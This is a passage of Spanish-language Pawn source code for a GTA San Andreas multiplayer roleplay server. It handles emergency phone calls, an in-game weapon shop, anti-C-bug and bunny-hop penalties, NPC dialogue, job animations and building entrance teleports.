			Mensaje(playerid, COLOR_CIAN, "Central: Ahora le enviamos una ambulancia, sea paciente.");
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
			SetTimerEx("RemoveHand", 1800, false, "i", playerid);
			Mobile[playerid] = 255;
			return 0;
		}
		if(Mobile[playerid] == 914)
		{
			if(!strlen(tmp))
			{
				Mensaje(playerid, COLOR_CIAN, "Central: Por favor, ¿una breve explicación de la situación?");
				return 0;
			}
			Mensaje(playerid, COLOR_CIAN, "Central: Entendido, ¿Su ubicacion por favor?");
			strmid(Situacion[playerid], text, 0, strlen(text), 255);
			Mobile[playerid] = 915;
			return 0;
		}
		if(Mobile[playerid] == 913)
		{
			if(!strlen(tmp))
			{
				Mensaje(playerid, COLOR_CIAN, "Comisaria: repítame que no le he entendido!");
				return 0;
			}
   			format(string, sizeof(string), "** Central: Han solicitado una patrulla. Lugar: (%s)", text);
			SendFamilyMessage(1, TEAM_RADIO_COLOR, string);
			format(string, sizeof(string), "** Central: Un tal %s denuncia: %s", PlayerName(playerid), Situacion[playerid]);
			SendFamilyMessage(1, TEAM_RADIO_COLOR, string);
			Mensaje(playerid, 0x0080FFFF, "Comisaria: una patrulla se pasará por la zona.");
			Mensaje(playerid, 0x0080FFFF, "Comisaria: Gracias por su información!");
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
			SetTimerEx("RemoveHand", 1800, false, "i", playerid);
			Mobile[playerid] = 255;
			return 0;
		}
		if(Mobile[playerid] == 912)
		{
			if(!strlen(tmp))
			{
				Mensaje(playerid, COLOR_CIAN, "Comisaria: no le entiendo., repíta porfavor!");
				return 0;
			}
			strmid(Situacion[playerid], text, 0, strlen(text), 255);
			format(string, sizeof(string), "Comisaria: Entendido señor %s, díganos su ubicación exacta", PlayerName(playerid));
			Mensaje(playerid, 0x0080FFFF, string);
			Mobile[playerid] = 913;
			return 0;
		}
		if(Mobile[playerid] == 911)
		{
			if(!strlen(tmp))
			{
				Mensaje(playerid, COLOR_CIAN, "EMERGENCIA:  Lo sentimos, no le entendimos, POLICIA o PARAMEDICO ?");
				return 0;
			}
			else if ((strcmp("Policia", tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen("Policia")))
			{
				Mensaje(playerid, COLOR_BLANCO, "--> Conexión establecida con LSPD.");
				Mensaje(playerid, 0x0080FFFF, "Central: Explique brevemente lo ocurrido.");
				Mobile[playerid] = 912;
				return 0;
			}
			else if ((strcmp("Paramedico", tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen("Paramedico"))){
			    Mensaje(playerid, COLOR_BLANCO, "--> Conexión establecida con SAMUR.");
				Mensaje(playerid, COLOR_CIAN, "Central: Explique brevemente lo ocurrido.");
				Mobile[playerid] = 914;
				return 0;
			}
			else
			{
				Mensaje(playerid, 0x0080FFFF, "EMERGENCIA: Lo sentimos, no le entendimos, POLICIA o PARAMEDICO ?");
				return 0;
			}
		}
		if(IsPlayerConnected(Mobile[playerid]))
		{
		    if(Mobile[Mobile[playerid]] == playerid)
		    {
				if(Speaker[Mobile[playerid]] == 1)
				{
				    format(string, sizeof(string), "(Altavoz): %s", text);
					ProxDetector(20.0, Mobile[playerid], string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
				}
				else
				{
				    format(string, sizeof(string), "(Voz en el Teléfono): %s", text);
				    Mensaje(Mobile[playerid], COLOR_AMARILLO2, string);
				}
			}
		}
		else
		{
			Mensaje(playerid, COLOR_GRIS2, "Nadie en línea!");
			return 0;
		}
		return 0;
	}
	    if(!booleano[gIngreso]{playerid})return false;
		return 0;
	}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	new string[212], Float:cx, Float:cy, Float:cz;
	GetPlayerPos(playerid, cx, cy, cz);
	
	//sistema venta de armas
	if(newkeys == KEY_SECONDARY_ATTACK && GetPlayerInterior(playerid) == 7)
	{
		for(new x=0;x<sizeof(armasventa);x++)
		{
			if(IsPlayerInRangeOfPoint(playerid, 1.0, armasventa[x][av@Pos][0], armasventa[x][av@Pos][1], armasventa[x][av@Pos][2]))
			{
				switch(armasventa[x][av@armaid])
				{
					case 50:
					{
						format(string, sizeof(string), "~n~~b~Chaleco~n~~g~Costo $: ~w~%d$ (Presionar Y)~n~~y~Costo ZZcash: ~w~%d (Presionar N)~n~", armasventa[x][av@Precio], armasventa[x][av@zzPrecio]);
					}
					default:
					{
						format(string, sizeof(string), "~n~~b~Arma: ~w~%s~n~~b~Municiones: ~w~%d~n~~g~Costo $: ~w~%d$ (Presionar Y)~n~~y~Costo ZZcash: ~w~%d (Presionar N)~n~", NombreArma(armasventa[x][av@armaid]), armasventa[x][av@municion], armasventa[x][av@Precio], armasventa[x][av@zzPrecio]);
					}
				}
				TextoInformatico(25, playerid, string);
				return 1;
			}
		}
	}
	else if(newkeys == KEY_YES && GetPlayerInterior(playerid) == 7)
	{
		for(new x=0;x<sizeof(armasventa);x++)
		{
			if(IsPlayerInRangeOfPoint(playerid, 1.0, armasventa[x][av@Pos][0], armasventa[x][av@Pos][1], armasventa[x][av@Pos][2]))
			{
				if(ReduceTimeb[playerid] > gettime())return Mensaje(playerid, COLOR_AMARILLO2, "Esta funcion se utiliza cada 2 segundos.");
				if(obtenerDinero(playerid) < armasventa[x][av@Precio])return Mensaje(playerid, COLOR_GRIS2, "No tienes suficiente dinero!");
				if(!cuenta[playerid][cLicenciaArma])return Mensaje(playerid, COLOR_GRIS2, "No posees la licencia de armas, por lo tanto no puedes comprar!");
				pierdeDinero(playerid, armasventa[x][av@Precio]);
				switch(armasventa[x][av@armaid])
				{
					case 50:
					{
						format(string, sizeof(string), "Usted compro un chaleco por %d dolares.", armasventa[x][av@Precio]);
						darArmadura(playerid, 100.0);
					}
					default:
					{
						format(string, sizeof(string), "Usted compro un(a) %s con %d balas por %d dolares.", NombreArma(armasventa[x][av@armaid]), armasventa[x][av@municion], armasventa[x][av@Precio]);
						darArma(playerid, armasventa[x][av@armaid], armasventa[x][av@municion]);
					}
				}
				ReduceTimeb[playerid] = gettime() + 2;
				Mensaje(playerid, COLOR_VERDE, string);
				return 1;
			}
		}
	}
	else if(newkeys == KEY_NO && GetPlayerInterior(playerid) == 7)
	{
		for(new x=0;x<sizeof(armasventa);x++)
		{
			if(ReduceTimeb[playerid] > gettime())return Mensaje(playerid, COLOR_AMARILLO2, "Esta funcion se utiliza cada 2 segundos.");
			if(IsPlayerInRangeOfPoint(playerid, 1.0, armasventa[x][av@Pos][0], armasventa[x][av@Pos][1], armasventa[x][av@Pos][2]))
			{
				if(cuenta[playerid][cZonaZeroCash] < armasventa[x][av@zzPrecio])return Mensaje(playerid, COLOR_GRIS2, "No tienes suficiente dinero!");
				cuenta[playerid][cZonaZeroCash] -= armasventa[x][av@zzPrecio];
				switch(armasventa[x][av@armaid])
				{
					case 50:
					{
						format(string, sizeof(string), "Usted compro un chaleco por %d zzcash.", armasventa[x][av@zzPrecio]);
						darArmadura(playerid, 100.0);
					}
					default:
					{
						format(string, sizeof(string), "Usted compro un(a) %s con %d balas por %d zzcash.", NombreArma(armasventa[x][av@armaid]), armasventa[x][av@municion], armasventa[x][av@zzPrecio]);
						darArma(playerid, armasventa[x][av@armaid], armasventa[x][av@municion]);
					}
				}
				ReduceTimeb[playerid] = gettime() + 2;
				Mensaje(playerid, COLOR_AMARILLO, string);
				return 1;
			}
		}
	}
	//
	if(newkeys == 2 && oldkeys == 4 || newkeys == 4 && oldkeys == 2)
	{
		if(GetPlayerWeapon(playerid) == 24)
		{
			enteroChar[antiCbug]{playerid}++;
			switch(enteroChar[antiCbug]{playerid})
			{
				case 2, 3:
				{
					Mensaje(playerid, COLOR_ROJO, "No esta permitido el C-BUG!");
				}
				case 4:
				{
					cuenta[playerid][cCarcel] = 1;
					cuenta[playerid][cTiempoCarcel] = 30 * 60;
					enteroChar[antiCbug]{playerid} = 0;
					
					quitarArmas(playerid);
					SetPosEx(playerid, 325.2867, 305.1505, 999.1484, 348.7300, 5, (playerid + 20));
					Mensaje(playerid, COLOR_ROJO, "Usted fue encarcelado por 30 minutos por usar C-BUG luego de las advertencias!");
				}
			}
		}
	}
	if(newkeys == 40 && oldkeys == 8 || newkeys == 8 && oldkeys == 40)
	{
		enteroChar[antiBH]{playerid}++;
		switch(enteroChar[antiBH]{playerid})
		{
			case 1:
			{
				entero[playerid][antiBHtime] = gettime() + 6;
			}
			case 6:
			{
				if(entero[playerid][antiBHtime] > gettime())
				{
					ApplyAnimation(playerid, "PED", "getup_front", 4.1, 0, 0, 0, 0, 0);
					
					new Float:vida;
					GetPlayerHealth(playerid, vida);
					SetHP(playerid, vida - 5.0);
					
					Mensaje(playerid, COLOR_ROJO, "Pierdes 5 HP por la caida, no hagas BH!");
					
					enteroChar[antiBH]{playerid} = 0;
					entero[playerid][antiBHtime] = 0;
				}
				else
				{
					enteroChar[antiBH]{playerid} = 0;
					entero[playerid][antiBHtime] = 0;
				}
			}
		}
	}
	if(newkeys == KEY_HANDBRAKE)
	{
		for(new i=0;i<sizeof(nonplayers);i++)
		{
			if(GetPlayerVirtualWorld(playerid) == nonplayers[i][npcWorld] && IsPlayerInRangeOfPoint(playerid, 2.0, nonplayers[i][npcPos][0], nonplayers[i][npcPos][1], nonplayers[i][npcPos][2]))
			{
				if(nonplayers[i][npcUtil] < gettime())
				{
					switch(i)
					{
						case 0 .. 2:
						{
							format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: Bienvenido al Banco de Los Santos ¿Que puedo hacer por usted?", nonplayers[i][npcNombre]);
							Mensaje(playerid, COLOR_BLANCO, string);
						}
						case 3 .. 4:
						{
							format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: Bienvenido al Ayuntamiento de Los Santos ¿Que puedo hacer por usted?", nonplayers[i][npcNombre]);
							Mensaje(playerid, COLOR_BLANCO, string);
						}
						case 5:
						{
							format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: Bienvenido a la cabina de Registro Ciudadano ¿Que puedo hacer por usted?", nonplayers[i][npcNombre]);
							Mensaje(playerid, COLOR_BLANCO, string);
						}
						case 6 .. 19, 46:
						{
							format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: ¿Que puedo hacer por usted?", nonplayers[i][npcNombre]);
							Mensaje(playerid, COLOR_BLANCO, string);
						}
						case 20:
						{
							format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: Se mira pero no se toca!", nonplayers[i][npcNombre]);
							Mensaje(playerid, COLOR_BLANCO, string);
						}
						case 21:
						{
							format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: ¿Como estas compañero? ¿Que puedo hacer por usted?", nonplayers[i][npcNombre]);
							Mensaje(playerid, COLOR_BLANCO, string);
						}
						case 23 .. 27:
						{
							format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: Bienvenido al 24/7 ¿Que puedo hacer por usted?", nonplayers[i][npcNombre]);
							Mensaje(playerid, COLOR_BLANCO, string);
						}
						case 28 .. 35, 47:
						{
							format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: Bienvenido al bar ¿Que desea tomar?", nonplayers[i][npcNombre]);
							Mensaje(playerid, COLOR_BLANCO, string);
						}
						case 36 .. 41:
						{
							format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: ¿Que combo desea comprar?", nonplayers[i][npcNombre]);
							Mensaje(playerid, COLOR_BLANCO, string);
						}
						case 42:
						{
							format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: ¿Que aparato electronico desea comprar?", nonplayers[i][npcNombre]);
							Mensaje(playerid, COLOR_BLANCO, string);
						}
						case 43:
						{
							format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: Bienvenido a Centro de licencia ¿Que examen desea realizar?", nonplayers[i][npcNombre]);
							Mensaje(playerid, COLOR_BLANCO, string);
						}
						case 44 .. 45:
						{
							format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: Bienvenido al concesionario ¿Que desea hacer?", nonplayers[i][npcNombre]);
							Mensaje(playerid, COLOR_BLANCO, string);
						}
					}
					ApplyActorAnimation(nonplayers[i][npcID], "PED", "IDLE_chat", 4.1, 0, 1, 1, 1, strlen(string) * 200);
					DesaparecerSelecion(playerid, 1);
					
					for(new k=0;k<6;k++)
					{
						TextDrawSetSelectable(nonplayers[i][interfaz][k], true);
						TextDrawShowForPlayer(playerid, nonplayers[i][interfaz][k]);
					}
					SelectTextDraw(playerid, COLOR_LIMA);
					
					entero[playerid][eActId] = i;
					nonplayers[i][npcUtil] = gettime() + 300;
					booleano[npcUse]{playerid} = true;
					return 1;
				}
				else
				{
					format(string, sizeof(string), "No puedes interactuar con %s en este momento.", nonplayers[i][npcNombre]);
					Mensaje(playerid, COLOR_GRIS, string);
					return 1;
				}
			}
		}	
	}
	if(newkeys == KEY_FIRE)
	{
		if(cuenta[playerid][servicio] && cuenta[playerid][cTrabajo] == 12 && !cuenta[playerid][selecciono2])
		{
			for(new i=3; i<sizeof(trabMinero); i++)
			{
				if(IsPlayerInRangeOfPoint(playerid, 1.0, trabMinero[i][minPos][0], trabMinero[i][minPos][1], trabMinero[i][minPos][2]))
				{
					ApplyAnimation(playerid, "SWORD", "sword_4", 4.1, 1, 1, 1, 1, 1, 1);
					cuenta[playerid][selecciono2] = i;
					TextoInformatico(9, playerid, "Extrayendo Mineral~n~~n~~n~~y~por favor espere...");
					SetTimerEx("transCargamento", 10000, false, "dd", playerid, 9);
					return 1;
				}
			}
		}
		else if(cuenta[playerid][servicio] && cuenta[playerid][cTrabajo] == 13 && !cuenta[playerid][selecciono2])
		{
			for(new i=1; i<sizeof(trabCarpintero); i++)
			{
				if(IsPlayerInRangeOfPoint(playerid, 1.0, trabCarpintero[i][carPos][0], trabCarpintero[i][carPos][1], trabCarpintero[i][carPos][2]))
				{
					ApplyAnimation(playerid, "BASEBALL", "bat_part", 4.1, 1, 1, 1, 1, 1, 1);
					ApplyAnimation(playerid, "BASEBALL", "bat_part", 4.1, 1, 1, 1, 1, 1, 1);
					cuenta[playerid][selecciono2] = i;
					TextoInformatico(9, playerid, "Construyendo Mueble~n~~n~~n~~y~por favor espere...");
					SetTimerEx("transCargamento", 10000, false, "dd", playerid, 10);
					return 1;
				}
			}
		}	
		else if(cuenta[playerid][servicio] && cuenta[playerid][cTrabajo] == 14 && !cuenta[playerid][selecciono2])
		{
			for(new i=1; i<sizeof(trabObrero); i++)
			{
				if(IsPlayerInRangeOfPoint(playerid, 1.0, trabObrero[i][obrPos][0], trabObrero[i][obrPos][1], trabObrero[i][obrPos][2]))
				{
					ApplyAnimation(playerid, "BASEBALL", "bat_part", 4.1, 1, 1, 1, 1, 1, 1);
					ApplyAnimation(playerid, "BASEBALL", "bat_part", 4.1, 1, 1, 1, 1, 1, 1);
					cuenta[playerid][selecciono2] = i;
					TextoInformatico(9, playerid, "Construyendo~n~~n~~n~~y~por favor espere...");
					SetTimerEx("transCargamento", 20000, false, "dd", playerid, 11);
					return 1;
				}
			}
		}
	}
	if(newkeys == KEY_YES)
	{
		if(IsPlayerConnected(playerid))
		{
			for(new i=0; i<sizeof(fabricas); i++)
			{
				if(IsPlayerInRangeOfPoint(playerid, 10.0, fabricas[i][f@entradasal][0], fabricas[i][f@entradasal][1], fabricas[i][f@entradasal][2]))
				{
					SetPlayerPos(playerid, fabricas[i][f@entradasal][3], fabricas[i][f@entradasal][4], fabricas[i][f@entradasal][5]);
					SetPlayerInterior(playerid, fabricas[i][f@int]);
					SetPlayerVirtualWorld(playerid, fabricas[i][f@world]);
					return 1;
				}
				else if(IsPlayerInRangeOfPoint(playerid, 10.0, fabricas[i][f@entradasal][3], fabricas[i][f@entradasal][4], fabricas[i][f@entradasal][5]))
				{
					if(fabricas[i][f@world] == GetPlayerVirtualWorld(playerid))
					{
						SetPlayerPos(playerid, fabricas[i][f@entradasal][0], fabricas[i][f@entradasal][1], fabricas[i][f@entradasal][2]);
						SetPlayerInterior(playerid, 0);
						SetPlayerVirtualWorld(playerid, 0);
						return 1;
					}
				}
			}
			
			if(IsPlayerInRangeOfPoint(playerid, 5.0, trabMinero[1][minPos][0], trabMinero[1][minPos][1], trabMinero[1][minPos][2]))
			{
				SetPlayerPos(playerid, trabMinero[0][minPos][0], trabMinero[0][minPos][1], trabMinero[0][minPos][2]);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 5.0, trabMinero[0][minPos][0], trabMinero[0][minPos][1], trabMinero[0][minPos][2]))
			{
				SetPlayerPos(playerid, trabMinero[1][minPos][0], trabMinero[1][minPos][1], trabMinero[1][minPos][2]);
			}
			//Ayuntamiento Enter
			if(PlayerToPointStripped(1, playerid, 1481.0374, -1772.3131, 18.7958, cx, cy, cz))
			{
				LoadObjects(playerid);
				SetPosEx(playerid, 330.9086, 138.8841, 1026.7579, 0, 3, 0);
				GameTextForPlayer(playerid, "~y~Ayuntamiento", 5000, 1);
			}
			//Ayuntamiento Exit
			else if(PlayerToPointStripped(1, playerid, 330.9086, 138.8841, 1026.7579, cx, cy, cz))
			{
				LoadObjects(playerid);
				SetPosEx(playerid, 1481.0374, -1772.3131, 18.7958, 0, 0, 0);
				GameTextForPlayer(playerid, "~w~los santos", 5000, 1);
			}
			// Entrada al Interior Iglesia
			else if(PlayerToPointStripped(1, playerid, 2233.9846, -1333.1912, 23.9815, cx, cy, cz))
			{
				LoadObjects(playerid);
				SetPosEx(playerid, 1963.8392, -349.6380, 1092.9454, 0, 0, 0);
			}
			// Salida al Exterior Iglesia
			else if(PlayerToPointStripped(1, playerid, 1963.8392, -349.6380, 1092.9454, cx, cy, cz))
			{
				LoadObjects(playerid);
				SetPosEx(playerid, 2233.9846, -1333.1912, 23.9815, 0, 0, 0);
			}
			// Entrada al Interior Hospital [FORT CARSON]
			else if(PlayerToPointStripped(1, playerid,-320.2980,1048.2344,20.3403, cx, cy, cz))
			{
				LoadObjects(playerid);
				SetPosEx(playerid,-204.3939,-1735.3229,675.7687, 0, 0, 0);
			}
			// Salida al Exterior Hospital [FORT CARSON]
			else if(PlayerToPointStripped(1, playerid,-204.3939,-1735.3229,675.7687, cx, cy, cz))
			{
				LoadObjects(playerid);
				SetPosEx(playerid,-320.2980,1048.2344,20.3403, 0, 0, 0);
			}
   			// Entrada al interior Restaurante La Dama
			else if(PlayerToPointStripped(1, playerid, 2633.0945, -1405.2313, 30.4524, cx, cy, cz))
			{
				LoadObjects(playerid);
				SetPosEx(playerid, 836.8066, 5510.7866, 7.0059, 0, 0, 0);
			}
			// Salida al Exterior Restaurante La Dama
			else if(PlayerToPointStripped(1, playerid, 836.8066, 5510.7866, 7.0059, cx, cy, cz))
			{
				LoadObjects(playerid);
				SetPosEx(playerid, 2633.0945, -1405.2313, 30.4524, 0, 0, 0);
			}
			// Entrada al PigPen
			else if(PlayerToPointStripped(1, playerid, 2421.5698, -1219.2428, 25.5615, cx, cy, cz))
			{
				LoadObjects(playerid);
				SetPosEx(playerid, 1204.809936, -11.586799, 1000.921875, 0, 2, 0);
			}
			// Salida del PigPen
			else if(PlayerToPointStripped(1, playerid, 1204.809936, -11.586799, 1000.921875, cx, cy, cz))
			{
				LoadObjects(playerid);
				SetPosEx(playerid, 2421.5698, -1219.2428, 25.5615, 0, 0, 0);
			}
			// Entrada al Interior Middleton Cafe
			else if(PlayerToPointStripped(1, playerid, 1555.5348, -1199.9865, 20.0236, cx, cy, cz))
			{
				LoadObjects(playerid);
				SetPosEx(playerid, -795.0830, 489.2804, 1376.1953, 0, 1, 5);
			}
			// Salida al Exterior Middleton Cafe
			else if(PlayerToPointStripped(1, playerid, -795.0830, 489.2804, 1376.1953, cx, cy, cz))
			{
				LoadObjects(playerid);
				SetPosEx(playerid, 1555.5348, -1199.9865, 20.0236, 0, 0, 0);
			}
			//Salida Puerto
			else if(PlayerToPointStripped(1, playerid, 895.1678, -2483.7361, 3098.3235, cx, cy, cz))
			{
				LoadObjects(playerid);
				SetPosEx(playerid, 587.5262, -1989.2592, 4.4332, 0, 0, 0);
			}
			//Entrada Comisaria
			else if(PlayerToPointStripped(1, playerid, 1554.9537, -1675.6584, 16.1953, cx, cy, cz))
			{
				LoadObjects(playerid);
				SetPosEx(playerid, 309.2832, -1513.9154, 3268.0940, 0, 0, 0);
			}
			//Salida Comisaria
			else if(PlayerToPointStripped(1, playerid, 309.2832, -1513.9154, 3266.0940, cx, cy, cz))
			{
				LoadObjects(playerid);
				SetPosEx(playerid, 1554.9537, -1675.6584, 16.1953, 0, 0, 0);
			}
			
			else if(PlayerToPointStripped(1, playerid, 790.4796, -367.0797, 994.2100, cx, cy, cz))
			{
				//Ascensor LSPD
				if(IsACop(playerid))
				{
					ShowPlayerDialog(playerid, DIALOG_LSPD_ELEVATOR, DIALOG_STYLE_LIST, "Ascensor LSPD", "¿ Donde desea ir ?", "Garage", "Salir");
					return 1;
				}else return GameTextForPlayer(playerid, "~r~Solo Policias!", 5000, 3);
			}
			else if(PlayerToPointStripped(1, playerid, -2662.1509, 537.2712, 48.0843, cx, cy, cz))
			{
				//Ascensor MEDICOS
				if(Team_SAMUR(playerid))
				{
					ShowPlayerDialog(playerid, DIALOG_SAMUR_ELEVATOR, DIALOG_STYLE_LIST, "{FFFFFF}¿Dónde desea ir? - {FC7F75}Ascensor", "» Garaje\n» Segunda Entrada", "Aceptar", "Cancelar");
					return 1;
				}else return GameTextForPlayer(playerid, "~r~solo personal!", 4000, 1);
			}
			//Hospital 1 puerta
			else if(PlayerToPointStripped(1, playerid, 2258.4861, 2454.7061, 38.6837, cx, cy, cz))
			{
				SetPlayerPos(playerid, 2343.3733, 2459.3279, 14.9742);
				return 1;
			}
			else if(PlayerToPointStripped(1, playerid, 2282.2898, 2423.4922, 3.4766, cx, cy, cz))
			{
				SetPlayerPos(playerid, 2343.3733, 2459.3279, 14.9742);
				return 1;
			}
			//Hospital 2 puerta
			else if(PlayerToPointStripped(1, playerid, 1600.4548, 1760.7028, -60.5523, cx, cy, cz))
			{
				SetPosEx(playerid, 1600.0018, 1765.1306, -60.0662, 0, 0, 0);
				return 1;
			}
			else if(PlayerToPointStripped(1, playerid, 1600.0018, 1765.1306, -60.0662, cx, cy, cz))
			{
				SetPosEx(playerid, 1600.4548, 1760.7028, -60.5523, 0, 0, 0);
				return 1;
			}
			//LSTV ENTER
			else if(PlayerToPointStripped(1, playerid, 759.8471, -1358.7413, 13.9899, cx, cy, cz))
			{
				ShowPlayerDialog(playerid, ENTER_LSTV, DIALOG_STYLE_LIST, "¿ Dónde desea ir ?", "LSTV Planta 1\tOficina\nLSTV Planta 2\tEstudio\nLSTV Planta 3\tTerraza", "Ir", "Salir");
				return 1;
			}
			//LSTV EXIT
			else if(PlayerToPointStripped(1, playerid, 243.2710, 302.7583, 999.1343, cx, cy, cz) || PlayerToPointStripped(1, playerid, -2719.7854, 519.2936, 48.3752, cx, cy, cz) || PlayerToPointStripped(1, playerid, 734.9713, -1358.6119, 25.5060, cx, cy, cz))
			{
				SetPosEx(playerid, 759.8471, -1358.7413, 13.9899, 20.0, 0, 0);
				return 1;
			}
			//LSPD Exit
			else if(PlayerToPointStripped(5, playerid, 747.60254, -387.92624, 1003.58502, cx, cy, cz))
			{
				LoadObjects(playerid);
				SetPlayerInterior(playerid, 0);
				SetPlayerPos(playerid, 1553.6621, -1675.5581, 16.1953);
				return 1;
			}
			//HOSPITAL PLANTA 2 ENTER
			else if(PlayerToPointStripped(1, playerid, -2665.0129, 535.0582, 48.0791, cx, cy, cz))
			{
				LoadObjects(playerid);
				SetPlayerPos(playerid, 275.0726, 126.1257, 1032.0173);
				return 1;
			}
			//HOSPITAL PLANTA 2 EXIT
			else if(PlayerToPointStripped(1, playerid, 275.0726, 126.1257, 1032.0173, cx, cy, cz))
			{
				SetPlayerPos(playerid, -2665.0129, 535.0582, 48.0791);
				return 1;
			}
			//Hospital Planta 3 Enter
			else if(PlayerToPointStripped(1, playerid, 251.4964, 131.8860, 1032.0173, cx, cy, cz))
			{
				LoadObjects(playerid);
				SetPosEx(playerid, 251.2338, 131.8673, 1037.7197, 271.2408, 0, 0);
				return 1;
			}
			//Hospital Planta 3 Exit
			else if(PlayerToPointStripped(1, playerid, 251.3875, 131.6661, 1037.7197, cx, cy, cz))
			{
				SetPosEx(playerid, 251.2338, 131.8809, 1032.0173, 271.2408, 0, 0);
				return 1;
			}
			//Hospital Los Santos ENTER
			else if (PlayerToPointStripped(1, playerid, 1173.2563, -1323.3102, 15.3943, cx, cy, cz))
			{
				SetPosEx(playerid, -2647.9604, 539.7050, 48.0835, 180, 0, 0);
				LoadObjects(playerid);
				return 1;
			}
			// Hospital EXIT
			else if(PlayerToPointStripped(1, playerid, -2647.4524, 539.1109, 48.0838, cx, cy, cz))
			{
				SetPosEx(playerid, 1173.2563, -1323.3102, 15.3943, 0, 0, 0);
				LoadObjects(playerid);
				return 1;
			}
			//Hospital Garage Emergencia
			else if(PlayerToPointStripped(1, playerid, 1144.9569, -1329.5032, 13.5840, cx, cy, cz))
			{
				LoadObjects(playerid);
				SetPosEx(playerid, -2662.1667, 537.7280, 48.0843, 0, 0, 0);
				return 1;
			}
			//Elevator DOWN
			else if (PlayerToPointStripped(1, playerid, 1161.5015, -1330.0845, 31.4937, cx, cy, cz) && GetPlayerVirtualWorld(playerid) == 0)
			{
				SetPosEx(playerid, -2662.1509, 537.2712, 48.0843, 180, 0, 0);
				GameTextForPlayer(playerid, "~r~hospital", 5000, 1);
				return 1;
			}
			//DMW Enter
			else if (PlayerToPointStripped(1, playerid, 2045.3928, -1908.0372, 13.5469, cx, cy, cz))
			{ 
				LoadObjects(playerid);
				SetPosEx(playerid, 2062.2095, -2214.4033, 2664.6157, 0, 0, 0);
				GameTextForPlayer(playerid, "~w~Centro de Licencias", 5000, 1);
				return 1;
			}
			//DMW Exit
			else if (PlayerToPointStripped(1, playerid, 2062.2095, -2214.4033, 2664.6157, cx, cy, cz))
			{
				SetPosEx(playerid, 2046.8928, -1908.0372, 13.5469, 280, 0, 0);
				GameTextForPlayer(playerid, "~w~Los Santos", 5000, 1);
				return 1;
			}
			//PD Elevator
			else if (PlayerToPointStripped(1, playerid, 1524.5724, -1677.8043, 6.2188, cx, cy, cz))
			{ 
				LoadObjects(playerid);
				SetPosEx(playerid, 302.8551, -1510.9399, 3267.0940, 270, 6, 0);
				GameTextForPlayer(playerid, "~w~Departamento De policia", 5000, 1);
				return 1;
			}
			//PD Elevator
			else if (PlayerToPointStripped(1, playerid, 302.8551, -1510.9399, 3267.0940, cx, cy, cz))
			{ 
				LoadObjects(playerid);
				SetPosEx(playerid, 1524.5724, -1677.8043, 6.2188, 288, 0, 0);
				GameTextForPlayer(playerid, "~w~Garage Policia", 5000, 1);
				return 1;
			}
			//PD Elevator
			else if (PlayerToPointStripped(1, playerid, 1557.7257, -1675.2711, 28.3955, cx, cy, cz))
			{ 
				SetPosEx(playerid, 302.8551, -1510.9399, 3267.0940, 270, 6, 0);
				GameTextForPlayer(playerid, "~w~Departamento De Policia", 5000, 1);
				return 1;
			}
			//Next to PD building
			else if(PlayerToPointStripped(1.5, playerid, 1570.3828, -1333.8882, 16.4844, cx, cy, cz))
			{
				SetPosEx(playerid, 1545.0068, -1366.5094, 327.2868, 0, 0, 0);
				GameTextForPlayer(playerid, "~w~Azotea edificio de Noticias", 5000, 1);
				return 1;
			}
			//Next to PD building
			else if(PlayerToPointStripped(1.5, playerid, 1548.8167, -1366.2247, 326.2109, cx, cy, cz))
			{
				SetPosEx(playerid, 1572.1115, -1332.5288, 16.4844, 0, 0, 0);
				GameTextForPlayer(playerid, "~w~Los Santos", 5000, 1);
				return 1;
			}
		// FBI Enter
		else if (PlayerToPointStripped(1, playerid, 1219.2152,-1811.7039,16.5938, cx, cy, cz))	SetPosEx(playerid, 238.6246, 138.7285, 1003.0234, 0, 3, 0);
		// Fbi Exit
		else if (PlayerToPointStripped(1, playerid, 238.6246, 138.7285, 1003.0234, cx, cy, cz)) SetPosEx(playerid, 1219.2152,-1811.7039,16.5938, 0, 0, 0);
		// FBI Planta
		else if (PlayerToPointStripped(1, playerid, 208.0704, 142.1360, 1003.0234, cx, cy, cz))	ShowPlayerDialog(playerid, DIALOG_FBI_ELEVATOR, DIALOG_STYLE_LIST, "FBI - ¿Donde deseas ir?", "Terraza", "Aceptar", "Cancelar");
		// Fbi Helipuerto
		else if (PlayerToPointStripped(1, playerid, 1241.6906,-1781.8174,33.6510, cx, cy, cz))	ShowPlayerDialog(playerid, DIALOG_FBI_ELEVATOR, DIALOG_STYLE_LIST, "FBI - ¿Donde deseas ir?", "Planta", "Aceptar", "Cancelar");
		// Fbi Garage
		else if(PlayerToPointStripped(1, playerid, 1213.1565, -975.6435, 43.4766, cx, cy, cz))
		{
	        LoadObjects(playerid);
			if(Team_FBI(playerid))ShowPlayerDialog(playerid, DIALOG_FBI_ELEVATOR, DIALOG_STYLE_LIST, "FBI - ¿Donde deseas ir?", "Terraza", "Aceptar", "Cancelar");
			else Mensaje(playerid, COLOR_GRIS2, "No perteneces al FBI, debes entrar por la puerta principal!");
		}

		else if(PlayerToPointStripped(1, playerid, 2729.3357, -2451.4373, 17.5937, cx, cy, cz)){//Guardia Nacional
			LoadObjects(playerid);
			SetPosEx(playerid, 630.0692, 839.3478, -90.2031, 0, 0, 0);
			GameTextForPlayer(playerid, "~g~P~w~rision~n~~w~Militar", 4000, 1);
		}
		else if(PlayerToPointStripped(1, playerid, 632.7405, 839.2097, -90.2031, cx, cy, cz)){
			SetPosEx(playerid, 2729.3357, -2451.4373, 17.5937, 0, 0, 0);
			GameTextForPlayer(playerid, "~g~Guardia~n~~w~Nacional", 5000, 1);
		}
